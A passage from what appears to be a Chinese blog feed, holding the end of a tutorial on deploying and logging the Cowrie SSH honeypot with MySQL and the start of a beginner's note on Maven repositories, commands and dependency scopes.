bash">The configuration <span class="hljs-keyword">for</span> Cowrie is stored <span class="hljs-keyword">in</span> cowrie.cfg.dist and cowrie.cfg (Located <span class="hljs-keyword">in</span> cowrie/etc). Both files are <span class="hljs-built_in">read</span> on startup, <span class="hljs-built_in">where</span> entries from cowrie.cfg take precedence. The .dist file can be overwritten by upgrades, cowrie.cfg will not be touched. To run with a standard configuration, there is no need to change anything. To <span class="hljs-built_in">enable</span> telnet, <span class="hljs-keyword">for</span> example, create cowrie.cfg and input only the following:<br><br>[telnet]<br>enabled = <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>大致内容就是蜜罐有两个配置文件cowrie.cfg.dist和cowrie.cfg，其中cowrie.cfg的优先级高于cowrie.cfg.dist，让我们创建cowrie.cfg并配置，<strong>在这里我们直接复制配置文件即可，因为我们只需要记录ssh不需要记录telnet</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 注意是./而不是/</span><br><span class="hljs-comment"># 查看配置文件cowrie.cfg.dist</span><br>(cowrie-env) cowrie@aliyun:~/cowrie$ cat etc/cowrie.cfg.dist<br><br><span class="hljs-comment"># 添加配置文件cowrie.cfg</span><br>(cowrie-env) cowrie@aliyun:~/cowrie$ cp etc/cowrie.cfg.dist etc/cowrie.cfg<br>(cowrie-env) cowrie@aliyun:~/cowrie$ cat etc/cowrie.cfg<br></code></pre></td></tr></table></figure><h4 id="Step6：设置端口转发"><a href="#Step6：设置端口转发" class="headerlink" title="Step6：设置端口转发"></a>Step6：设置端口转发</h4><p>编辑sshd配置文件，<strong>在里面添加一个端口55522，这个端口是用于我们服务器ssh登录的</strong>，22号端口是默认的ssh登录端口，因此我们将22端口的流量转发到2222（蜜罐的端口上）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 监听端口55522</span><br>$ sudo vim /etc/ssh/sshd_config<br>$ cat /etc/ssh/sshd_config<br>...<br>Port 22<br>Port 55522<br>...<br><br><span class="hljs-comment"># 重启服务</span><br>$ sudo systemctl restart sshd<br><br><span class="hljs-comment"># 可以看到55522端口已经开放</span><br>$ netstat -tunlp<br>(Not all processes could be identified, non-owned process info<br> will not be shown, you would have to be root to see it all.)<br>Active Internet connections (only servers)<br>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name<br>tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -<br>tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -<br>tcp        0      0 127.0.0.1:6010          0.0.0.0:*               LISTEN      -<br>tcp        0      0 127.0.0.1:6011          0.0.0.0:*               LISTEN      -<br>tcp        0      0 0.0.0.0:55522           0.0.0.0:*               LISTEN      -<br>...<br><br><span class="hljs-comment"># 将ssh（22）服务的端口转发到蜜罐端口（2222）上</span><br>$ sudo iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222<br></code></pre></td></tr></table></figure><h4 id="Step7：启动蜜罐"><a href="#Step7：启动蜜罐" class="headerlink" title="Step7：启动蜜罐"></a>Step7：启动蜜罐</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 当前路径</span><br>cowrie@aliyun:~/cowrie/bin$ <span class="hljs-built_in">pwd</span><br>/home/cowrie/cowrie/bin<br><br><span class="hljs-comment"># 启动蜜罐 </span><br>cowrie@aliyun:~/cowrie/bin$ ./cowrie start<br></code></pre></td></tr></table></figure><h4 id="Step8：连接数据库"><a href="#Step8：连接数据库" class="headerlink" title="Step8：连接数据库"></a>Step8：连接数据库</h4><p>cowrie中产生的日志杂乱无章，即使放到日志分析工具中也很难制定规则去筛选，然而cowrie具备将攻击IP、时间、历史执行命令等记录直接存在数据库中，下面将说明如何配置数据库</p><h5 id="python安装mysql依赖"><a href="#python安装mysql依赖" class="headerlink" title="python安装mysql依赖"></a>python安装mysql依赖</h5><p>因为蜜罐是运行在python的虚拟环境中的，所以需要下载python对于mysql的依赖库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># python安装mysql依赖</span><br>root@aliyun:~<span class="hljs-comment"># su - cowrie</span><br>cowrie@aliyun:~$ <span class="hljs-built_in">source</span> cowrie/cowrie-env/bin/activate<br>(cowrie-env) cowrie@aliyun:~$ pip install mysql-connector-python<br></code></pre></td></tr></table></figure><h5 id="安装数据库"><a href="#安装数据库" class="headerlink" title="安装数据库"></a>安装数据库</h5><p>安装mysql</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 安装mysql数据库</span><br>admin@aliyun:~$ sudo apt-get install mysql-server mysql-client libmysqlclient-dev<br><br><span class="hljs-comment"># 查看mysql是否成功安装</span><br>admin@aliyun:~$ sudo netstat -tunlp | grep 3306<br>tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      19878/mysqld<br>admin@aliyun:~$ sudo netstat -tunlp | grep mysql<br>tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      19878/mysqld<br></code></pre></td></tr></table></figure><h5 id="进行数据库的配置"><a href="#进行数据库的配置" class="headerlink" title="进行数据库的配置"></a>进行数据库的配置</h5><p>创建蜜罐的数据库角色，并进行授权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 连接数据库</span><br>admin@aliyun:~$ sudo mysql -u root -p<br>Enter password:<br>Welcome to the MySQL monitor.  Commands end with ; or \g.<br>Your MySQL connection id is 3<br>Server version: 5.7.35-0ubuntu0.18.04.1 (Ubuntu)<br><br>Copyright (c) 2000, 2021, Oracle and/or its affiliates.<br><br>Oracle is a registered trademark of Oracle Corporation and/or its<br>affiliates. Other names may be trademarks of their respective<br>owners.<br><br>Type <span class="hljs-string">&#x27;help;&#x27;</span> or <span class="hljs-string">&#x27;\h&#x27;</span> <span class="hljs-keyword">for</span> <span class="hljs-built_in">help</span>. Type <span class="hljs-string">&#x27;\c&#x27;</span> to clear the current input statement.<br>mysql&gt; show databases;<br>+--------------------+<br>| Database           |<br>+--------------------+<br>| information_schema |<br>| mysql              |<br>| performance_schema |<br>| sys                |<br>+--------------------+<br>4 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br><span class="hljs-comment"># 创建数据库cowrie</span><br>mysql&gt; CREATE DATABASE cowrie;<br>Query OK, 1 row affected (0.00 sec)<br><br><span class="hljs-comment"># 设置Cowrie帐户的权限，以下命令为授权账户进行日志记录功能的最低权限</span><br>mysql&gt; GRANT ALL ON cowrie.* TO <span class="hljs-string">&#x27;cowrie&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span> IDENTIFIED BY <span class="hljs-string">&#x27;PASSWORD HERE&#x27;</span>;<br><br><span class="hljs-comment"># 刷新并退出</span><br>mysql&gt; FLUSH PRIVILEGES;<br>mysql&gt; <span class="hljs-built_in">exit</span><br></code></pre></td></tr></table></figure><h5 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h5><p>测试蜜罐数据库用户是否可以正常连接数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 接下来，使用Cowrie帐户登录MySQL数据库来验证是否可以登录（权限配置正确），并加载 docs/sql/ 目录中提供的数据库架构</span><br>$ <span class="hljs-built_in">cd</span> ~/cowrie/docs/sql/<br>$ mysql -u cowrie -p<br>mysql&gt; USE cowrie;<br>mysql&gt; <span class="hljs-built_in">source</span> mysql.sql;<br>mysql&gt; <span class="hljs-built_in">exit</span><br></code></pre></td></tr></table></figure><h5 id="添加蜜罐连接数据库的配置"><a href="#添加蜜罐连接数据库的配置" class="headerlink" title="添加蜜罐连接数据库的配置"></a>添加蜜罐连接数据库的配置</h5><p>蜜罐启用mysql数据库进行记录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 修改cowrie蜜罐配置文件，启用mysql记录ssh登录的信息</span><br><span class="hljs-comment"># 这里需要注意一下，不是添加，在我们复制的时候配置文件中就有这个配置项，修改enabled = true即可</span><br>cowrie@aliyun:~$ <span class="hljs-built_in">cd</span> ~/cowrie/<br>cowrie@aliyun:~/cowrie$ vim etc/cowrie.cfg<br>......<br>[output_mysql]<br>host = localhost<br>database = cowrie<br>username = cowrie<br>password = PASSWORD HERE<br>port = 3306<br>debug = <span class="hljs-literal">false</span><br>enabled = <span class="hljs-literal">true</span><br>......<br></code></pre></td></tr></table></figure><h5 id="重启蜜罐，检测是否配置正确"><a href="#重启蜜罐，检测是否配置正确" class="headerlink" title="重启蜜罐，检测是否配置正确"></a>重启蜜罐，检测是否配置正确</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 重启蜜罐</span><br>$ <span class="hljs-built_in">cd</span> ~/cowrie/bin/<br>$ ./cowrie restart<br><br><span class="hljs-comment"># 重启之后，查看蜜罐的日志文件日志是否正确记录，输出如下即为正常</span><br>$ <span class="hljs-built_in">cd</span> ~/cowrie/var/<span class="hljs-built_in">log</span>/cowrie/<br>$ tail cowrie.log<br>...<br>2021-08-17T20:28:51.304746Z [-] Loaded output engine: jsonlog<br>2021-08-17T20:28:51.326227Z [-] Loaded output engine: mysql<br>...<br>2021-08-17T20:28:51.346992Z [-] Ready to accept SSH connections<br></code></pre></td></tr></table></figure><p>ok，到此为止蜜罐就配置完了，期待几天之后可以捕获到什么内容吧</p><h3 id="TroubleShoting"><a href="#TroubleShoting" class="headerlink" title="TroubleShoting"></a>TroubleShoting</h3><p>按捺不住心中的喜悦，一直在数据库里面看，发现什么也没有，同时查看cowrie日志，发现一直有个错误</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql.connector.errors.DatabaseError: 1273 (HY000): Unknown collation: <span class="hljs-string">&#x27;utf8mb4_0900_ai_ci&#x27;</span><br></code></pre></td></tr></table></figure><p>参考了网上的很多资料，说是编码的问题，于是换了编码，还是一直报错，后来在作者的Issues下找到了答案，附上该问题的连接： <a href="https://github.com/cowrie/cowrie/issues/1580">https://github.com/cowrie/cowrie/issues/1580</a> ，解决方法如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 作者原文：You can try modifying src/cowrie/output/mysql.py and see if changing charset to utf8 will help, or add the collate option, around line 75. Let me know how it works out!</span><br><span class="hljs-comment"># 修改src/cowrie/output/mysql.py的第75行，将编码设置为utf8</span><br><br><span class="hljs-comment"># 当前路径</span><br>cowrie@aliyun:~/cowrie$ <span class="hljs-built_in">pwd</span><br>/home/cowrie/cowrie<br><br><span class="hljs-comment"># 修改文件内容，将75行的编码修改为utf-8</span><br>cowrie@aliyun:~/cowrie$ vim src/cowrie/output/mysql.py<br>cowrie@aliyun:~/cowrie$ cat src/cowrie/output/mysql.py<br>...<br>    def start(self):<br>        self.debug = CowrieConfig.getboolean(<span class="hljs-string">&quot;output_mysql&quot;</span>, <span class="hljs-string">&quot;debug&quot;</span>, fallback=False)<br>        port = CowrieConfig.getint(<span class="hljs-string">&quot;output_mysql&quot;</span>, <span class="hljs-string">&quot;port&quot;</span>, fallback=3306)<br>        try:<br>            self.db = ReconnectingConnectionPool(<br>                <span class="hljs-string">&quot;mysql.connector&quot;</span>,<br>                host=CowrieConfig.get(<span class="hljs-string">&quot;output_mysql&quot;</span>, <span class="hljs-string">&quot;host&quot;</span>),<br>                db=CowrieConfig.get(<span class="hljs-string">&quot;output_mysql&quot;</span>, <span class="hljs-string">&quot;database&quot;</span>),<br>                user=CowrieConfig.get(<span class="hljs-string">&quot;output_mysql&quot;</span>, <span class="hljs-string">&quot;username&quot;</span>),<br>                passwd=CowrieConfig.get(<span class="hljs-string">&quot;output_mysql&quot;</span>, <span class="hljs-string">&quot;password&quot;</span>, raw=True),<br>                port=port,<br>                cp_min=1,<br>                cp_max=1,<br>                charset=<span class="hljs-string">&quot;utf8&quot;</span>,  <span class="hljs-comment"># 这里</span><br>                cp_reconnect=True,<br>                use_unicode=True,<br>            )<br>        <span class="hljs-comment"># except (MySQLdb.Error, MySQLdb._exceptions.Error) as e:</span><br>        except Exception as e:<br>            log.msg(f<span class="hljs-string">&quot;output_mysql: Error &#123;e.args[0]&#125;: &#123;e.args[1]&#125;&quot;</span>)<br>        ...<br>        <br><span class="hljs-comment"># 重启蜜罐</span><br>cowrie@aliyun:~/cowrie$ <span class="hljs-built_in">cd</span> bin/<br>cowrie@aliyun:~/cowrie$ ./cowrie restart<br></code></pre></td></tr></table></figure><p>好了，现在我们就设置好了，使用root/123登录，验证是否修改正确了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 登录数据库</span><br>cowrie@aliyun:~/cowrie$ mysql -u cowrie -p<br>Enter password:<br>Welcome to the MySQL monitor.  Commands end with ; or \g.<br>Your MySQL connection id is 81<br>Server version: 5.7.35-0ubuntu0.18.04.1 (Ubuntu)<br><br>Copyright (c) 2000, 2021, Oracle and/or its affiliates.<br><br>Oracle is a registered trademark of Oracle Corporation and/or its<br>affiliates. Other names may be trademarks of their respective<br>owners.<br><br>Type <span class="hljs-string">&#x27;help;&#x27;</span> or <span class="hljs-string">&#x27;\h&#x27;</span> <span class="hljs-keyword">for</span> <span class="hljs-built_in">help</span>. Type <span class="hljs-string">&#x27;\c&#x27;</span> to clear the current input statement.<br><br>mysql&gt; use cowrie;<br>Reading table information <span class="hljs-keyword">for</span> completion of table and column names<br>You can turn off this feature to get a quicker startup with -A<br><br>Database changed<br>mysql&gt; select * from auth;<br>+----+--------------+---------+----------+----------+---------------------+<br>| id | session      | success | username | password | timestamp           |<br>+----+--------------+---------+----------+----------+---------------------+<br>|  3 | 9068effacdae |       1 | root     | 123      | 2021-08-18 13:22:33 |<br>+----+--------------+---------+----------+----------+---------------------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br></code></pre></td></tr></table></figure><p>ok，数据已经存在了</p><h3 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h3><p>第二天就捕获到不少ssh登录的信息，可以收集一下做个字典，嘿嘿</p><img src="/img/20210819蜜罐学习/1.png"><p>还有登录后执行的操作</p><img src="/img/20210819蜜罐学习/2.png"><p>可以学习学习思路什么的~</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><p><a href="http://www.lmxspace.com/2018/05/11/%E8%9C%9C%E7%BD%90%E5%AD%A6%E4%B9%A0/">http://www.lmxspace.com/2018/05/11/%E8%9C%9C%E7%BD%90%E5%AD%A6%E4%B9%A0/</a></p></li><li><p><a href="https://www.cnblogs.com/HacTF/p/8094516.html">https://www.cnblogs.com/HacTF/p/8094516.html</a></p></li><li><p>cowrie官方文档：<a href="https://cowrie.readthedocs.io/en/latest/INSTALL.html">https://cowrie.readthedocs.io/en/latest/INSTALL.html</a></p></li><li><p>好多蜜罐：<a href="https://github.com/paralax/awesome-honeypots/blob/master/README_CN.md">https://github.com/paralax/awesome-honeypots/blob/master/README_CN.md</a></p></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>蜜罐</tag>
      
      <tag>恶意样本</tag>
      
      <tag>攻击溯源</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Maven学习</title>
    <link href="/2021/08/16/Maven%E5%AD%A6%E4%B9%A0/"/>
    <url>/2021/08/16/Maven%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h3 id="Maven是什么"><a href="#Maven是什么" class="headerlink" title="Maven是什么"></a>Maven是什么</h3><p>Maven 是一个项目管理工具，它包含了：</p><ul><li>一个项目对象模型 (POM：Project Object Model)</li><li>一组标准集合</li><li>一个项目生命周期(Project Lifecycle)</li><li>一个依赖管理系统(Dependency Management System)</li><li>用来运行定义在生命周期阶段(phase)中插件(plugin)目标(goal)的逻辑</li></ul><h3 id="Maven下载安装"><a href="#Maven下载安装" class="headerlink" title="Maven下载安装"></a>Maven下载安装</h3><ul><li>下载：<a href="https://archive.apache.org/dist/maven/maven-3/">https://archive.apache.org/dist/maven/maven-3/</a></li><li>安装</li><li>配置<ul><li>系统变量总添加%MAVEN_HOME%，路径为Maven安装路径（不是bin，是安装目录）</li><li>添加path，值为%MAVEN_HOME%/bin</li><li>打开cmd运行mvn -v，出现以下结果表示安装成功  <img src="/img/Maven学习/1.png"></li></ul></li></ul><h3 id="Maven仓库"><a href="#Maven仓库" class="headerlink" title="Maven仓库"></a>Maven仓库</h3><h4 id="仓库的概念"><a href="#仓库的概念" class="headerlink" title="仓库的概念"></a>仓库的概念</h4><p>用来存储下载的插件和 jar 包</p><h4 id="三种仓库"><a href="#三种仓库" class="headerlink" title="三种仓库"></a>三种仓库</h4><ul><li>本地仓库<ul><li>用来存储从远程仓库或中央仓库下载的插件和 jar 包，项目使用一些插件或 jar 包</li><li>优先从本地仓库查找</li><li>默认本地仓库位置在 USER_HOME/.m2/repository</li></ul></li><li>远程仓库<ul><li>如果本地需要插件或者jar包，本地仓库没有，默认去远程仓库下载</li><li>远程仓库可以在互联网内也可以在局域网内</li></ul></li><li>中央仓库<ul><li>在 maven 软件中内置一个远程仓库地址 <a href="http://repo1.maven.org/maven2">http://repo1.maven.org/maven2</a> ，它是中央仓库，服务于整个互联网，它是由 Maven 团队自己维护，里面存储了非常全的 jar 包，它包含了世界上大部分流行的开源项目构件</li></ul></li></ul><h5 id="本地仓库的配置"><a href="#本地仓库的配置" class="headerlink" title="本地仓库的配置"></a>本地仓库的配置</h5><p>打开MAVE_HOME/conf/settings.xml，添加如下内容</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">localRepository</span>&gt;</span>D:\JetBrains\apache-maven-3.6.0\mvn-repo<span class="hljs-tag">&lt;/<span class="hljs-name">localRepository</span>&gt;</span><br></code></pre></td></tr></table></figure><h5 id="远程仓库的配置"><a href="#远程仓库的配置" class="headerlink" title="远程仓库的配置"></a>远程仓库的配置</h5><p>打开MAVE_HOME/conf/settings.xml，添加如下内容</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">mirror</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>alimaven<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>aliyun maven<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">url</span>&gt;</span>http://maven.aliyun.com/nexus/content/groups/public/<span class="hljs-tag">&lt;/<span class="hljs-name">url</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">mirrorOf</span>&gt;</span>central<span class="hljs-tag">&lt;/<span class="hljs-name">mirrorOf</span>&gt;</span>          <br><span class="hljs-tag">&lt;/<span class="hljs-name">mirror</span>&gt;</span> <br></code></pre></td></tr></table></figure><h4 id="Maven常用的命令"><a href="#Maven常用的命令" class="headerlink" title="Maven常用的命令"></a>Maven常用的命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># compile是maven工程的编译命令，作用是将 src/main/java下的文件编译为class文件输出到 target目录下</span><br>mvn compile<br><br><span class="hljs-comment"># test是maven工程的测试命令,作用是执行src/test/java下的单元测试类</span><br>mvn <span class="hljs-built_in">test</span><br><br><span class="hljs-comment"># clean是maven工程的清理命令，执行clean会删除target目录及内容</span><br>mvn clean<br><br><span class="hljs-comment"># package是maven工程的打包命令，对于java工程执行package打成jar包，对于web工程打成war包</span><br>maven package<br><br><span class="hljs-comment"># install是maven工程的安装命令，执行nstall将maven打成jar包或war包发布到本地仓库</span><br>maven install<br></code></pre></td></tr></table></figure><p><strong>Maven命令的特点：当后面的命令执行时，前面的操作过程也都会自动执行</strong></p><h4 id="Maven坐标"><a href="#Maven坐标" class="headerlink" title="Maven坐标"></a>Maven坐标</h4><p>百度搜索，选择热度最高的，添加到pom.xml，刷新即可</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/junit/junit --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.12<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- &lt;scope&gt;test&lt;/scope&gt; --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h5 id="依赖范围（scope）"><a href="#依赖范围（scope）" class="headerlink" title="依赖范围（scope）"></a>依赖范围（scope）</h5><img src="/img/Maven学习/5.png"><ul><li>compile<ul><li>编译范围，指 A 在编译时依赖 B，此范围为默认依赖范围</li><li>编译范围的依赖会用在编译、测试、运行，由于运行时需要所以编译范围的依赖会被打包</li></ul></li><li>provided<ul><li>provided 依赖只有在当 JDK 或者一个容器已提供该依赖之后才使用， provided 依赖在编译和测试时需要，在运行时不需要</li><li>比如：servlet api 被 tomcat 容器提供</li></ul></li><li>runtime<ul><li>runtime 依赖在运行和测试系统的时候需要，但在编译的时候不需要</li><li>比如：jdbc的驱动包，由于运行时需要所以 runtime 范围的依赖会被打包</li></ul></li><li>test<ul><li>test 范围依赖 在编译和运行时都不需要，它们只有在测试编译和测试运行阶段可用</li><li>比如：junit，由于运行时不需要所以 test 范围依赖不会被打包</li></ul></li><li>system：system 范围依赖与 provided 类似，但是你必须显式的提供一个对于本地系统中 JAR文件的路径，需要指定 systemPath 磁盘路径，system 依赖不推荐使用</li></ul><h3 id="错误解决"><a href="#错误解决" class="headerlink" title="错误解决"></a>错误解决</h3><p>在创建Maven项目中遇到如下两个错误</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span>错误：不支持的发行版本<span class="hljs-number">5</span><br><br><span class="hljs-attribute">Error</span>：java：不再支持源选项 <span class="hljs-number">5</span>，请使用 <span class="hljs-number">6</span> 或更高版本<br></code></pre></td></tr></table></figure><p>查了网上一些资料，解决办法如下</p><h4 id="第一步：Settings"><a href="#第一步：Settings" class="headerlink" title="第一步：Settings"></a>第一步：Settings</h4><p>打开File-Settigs</p><img src="/img/Maven学习/2_1.png"><p>按照如下步骤设置，<strong>设置自己的JDK版本，我的是11</strong></p><img src="/img/Maven学习/2_2.png"><h4 id="第二步：Project-Structure"><a href="#第二步：Project-Structure" class="headerlink" title="第二步：Project Structure"></a>第二步：Project Structure</h4><p>打开File-Project Structure</p><img src="/img/Maven学习/3.png"><p>跟Settings设置一样，<strong>选择自己的JDK版本，我的是11</strong></p><img src="/img/Maven学习/3_2.png"><img src="/img/Maven学习/3_3.png"><h4 id="第三步：添加插件"><a href="#第三步：添加插件" class="headerlink" title="第三步：添加插件"></a>第三步：添加插件</h4><p>打开pom.xml，添加如下内容</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1<span class="hljs-tag">&lt;/<span 